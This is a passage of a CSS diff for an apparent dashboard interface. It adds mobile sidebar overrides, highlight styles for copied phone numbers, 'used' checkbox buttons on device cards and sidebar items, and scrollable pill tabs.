     width: 36px;
@@ -7156,11 +7877,21 @@
       transform: translateX(-100%);
       transition: transform 260ms cubic-bezier(0.4, 0, 0.2, 1);
       width: min(300px, 85vw) !important;
+      min-width: 0 !important;
+      max-width: none !important;
       box-shadow: 4px 0 30px rgba(0, 0, 0, 0.6);
       padding-bottom: 0 !important;
     }
+    .sidebar.desktop-closed {
+      width: min(300px, 85vw) !important;
+      opacity: 1;
+      pointer-events: auto;
+    }
     .sidebar.mob-open {
       transform: translateX(0);
+    }
+    .sidebar-resize-handle {
+      display: none;
     }
     .side-dev-list {
       padding-bottom: 28px !important;
@@ -8071,30 +8802,54 @@
   .dev-card:hover {
     background: #141b2d;
   }
+  /* Copied-number persistent highlight (teal) — stays until next copy */
+  .dev-card-copied {
+    background: rgba(56, 189, 248, 0.18) !important;
+    box-shadow: inset 0 0 0 1.5px rgba(56, 189, 248, 0.6), 0 0 12px rgba(56,189,248,0.15);
+  }
   .dev-card-sel {
     background: rgba(249, 115, 22, 0.06) !important;
   }
   .dev-card-used {
     opacity: 0.55;
   }
-  /* Used/Free badge on card */
-  .dev-card-used-badge {
+  /* Used checkbox button on card */
+  .dev-card-used-chk {
+    display: inline-flex;
+    align-items: center;
+    gap: 3px;
     font-size: 8.5px;
     font-weight: 800;
     letter-spacing: 0.05em;
-    padding: 1px 5px;
-    border-radius: 3px;
+    padding: 2px 6px 2px 4px;
+    border-radius: 4px;
     flex-shrink: 0;
+    cursor: pointer;
+    font-family: inherit;
+    border: none;
+    transition: background 120ms, color 120ms, box-shadow 120ms, transform 80ms;
+    line-height: 1;
   }
-  .dcub-used {
-    background: rgba(239,68,68,0.12);
+  .dev-card-used-chk:active {
+    transform: scale(0.93);
+  }
+  .dcuc-checked {
+    background: rgba(239,68,68,0.15);
     color: #ef4444;
-    border: 1px solid rgba(239,68,68,0.25);
+    box-shadow: 0 0 0 1px rgba(239,68,68,0.3);
   }
-  .dcub-fresh {
-    background: rgba(34,197,94,0.1);
+  .dcuc-checked:hover {
+    background: rgba(239,68,68,0.25);
+    box-shadow: 0 0 0 1px rgba(239,68,68,0.5);
+  }
+  .dcuc-unchecked {
+    background: rgba(34,197,94,0.08);
     color: #22c55e;
-    border: 1px solid rgba(34,197,94,0.2);
+    box-shadow: 0 0 0 1px rgba(34,197,94,0.2);
+  }
+  .dcuc-unchecked:hover {
+    background: rgba(34,197,94,0.18);
+    box-shadow: 0 0 0 1px rgba(34,197,94,0.4);
   }
   /* Clickable phone number */
   .dev-card-phone-btn {
@@ -9839,10 +10594,18 @@
     gap: 3px;
     padding: 3px 8px 4px;
     flex-shrink: 0;
+    overflow-x: auto;
+    overflow-y: hidden;
+    scrollbar-width: none; /* Firefox */
+    -ms-overflow-style: none; /* IE */
+  }
+  .side-dev-pills::-webkit-scrollbar {
+    display: none; /* Chrome/Safari */
   }
   .sdp {
-    flex: 1;
-    padding: 3px 2px;
+    flex: 0 0 auto;
+    min-width: 36px;
+    padding: 3px 6px;
     border-radius: 5px;
     border: 1px solid rgba(255, 255, 255, 0.07);
     background: transparent;
@@ -9856,6 +10619,7 @@
     align-items: center;
     justify-content: center;
     gap: 3px;
+    white-space: nowrap;
   }
   .sdp:hover {
     color: #94a3b8;
@@ -9930,6 +10694,11 @@
   }
   .sdv-item.sdv-sel {
     background: rgba(249, 115, 22, 0.08);
+  }
+  /* Copied-number persistent highlight in sidebar — stays until next copy */
+  .sdv-item.sdv-copied {
+    background: rgba(56, 189, 248, 0.16) !important;
+    box-shadow: inset 3px 0 0 #38bdf8, inset 0 0 0 1px rgba(56,189,248,0.35);
   }
   .sdv-bar {
     position: absolute;
@@ -10028,6 +10797,41 @@
     font-weight: 700;
     flex-shrink: 0;
     font-family: "JetBrains Mono", monospace;
+  }
+  /* Sidebar used checkbox */
+  .sdv-used-chk {
+    width: 20px;
+    height: 20px;
+    border-radius: 4px;
+    border: none;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+    transition: background 120ms, box-shadow 120ms, transform 80ms;
+    padding: 0;
+    font-family: inherit;
+  }
+  .sdv-used-chk:active { transform: scale(0.9); }
+  .sdvuc-checked {
+    background: rgba(239,68,68,0.15);
+    color: #ef4444;
+    box-shadow: 0 0 0 1px rgba(239,68,68,0.3);
+  }
+  .sdvuc-checked:hover {
+    background: rgba(239,68,68,0.28);
+    box-shadow: 0 0 0 1px rgba(239,68,68,0.55);
+  }
+  .sdvuc-unchecked {
+    background: rgba(255,255,255,0.05);
+    color: rgba(255,255,255,0.25);
+    box-shadow: 0 0 0 1px rgba(255,255,255,0.08);
+  }
+  .sdvuc-unchecked:hover {
+    background: rgba(34,197,94,0.12);
+    color: #22c55e;
+    box-shadow: 0 0 0 1px rgba(34,197,94,0.3);
   }
   .sdv-copy {
     width: 20px;
